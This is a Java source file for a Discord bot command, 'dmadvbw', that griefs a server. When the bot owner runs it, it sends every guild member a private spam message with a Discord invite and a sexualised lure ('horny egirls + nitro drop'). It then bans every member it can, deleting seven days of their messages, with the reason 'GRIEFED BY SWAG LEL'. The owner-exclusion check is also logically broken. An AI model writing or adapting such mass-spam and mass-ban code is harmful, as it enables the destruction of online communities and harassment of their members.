package me.comu.exeter.commands.owner;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import me.comu.exeter.logging.Logger;
import me.comu.exeter.utility.Utility;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.exceptions.HierarchyException;

import java.util.Arrays;
import java.util.List;

public class DmAdvBanwaveCommand implements ICommand {

    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        if (!(event.getAuthor().getIdLong() == Core.OWNERID )) {
            return;
        }
        Thread banwave1 = new Thread(() -> {
            try {
                for (Member member : event.getGuild().getMembers()) {
                    if (member.getIdLong() != Core.OWNERID || !member.getId().equals(event.getAuthor().getId())) {
                        Utility.sendPrivateMessage(event.getJDA(), member.getUser().getId(), "https://discord.gg/5KwAktW **horny egirls + nitro drop + packing events** hacked by swag");
                        if (event.getGuild().getSelfMember().canInteract(member) && !member.getUser().isBot())
                        event.getGuild().ban(member, 7).reason("GRIEFED BY SWAG LEL").queue();
                        Logger.getLogger().print("Banned " + member.getUser().getAsTag());
                        Thread.sleep(300);
                    }
                }
            } catch (HierarchyException | InterruptedException ignored) {}
        });
        banwave1.start();
    }

    @Override
    public String getHelp() {
        return "Use at your own risk\n`" + Core.PREFIX + getInvoke() + "`\nAliases: `" + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "dmadvbw";
    }

    @Override
    public String[] getAlias() {
        return new String[0];
    }

     @Override
    public Category getCategory() {
        return Category.OWNER;
    }
}
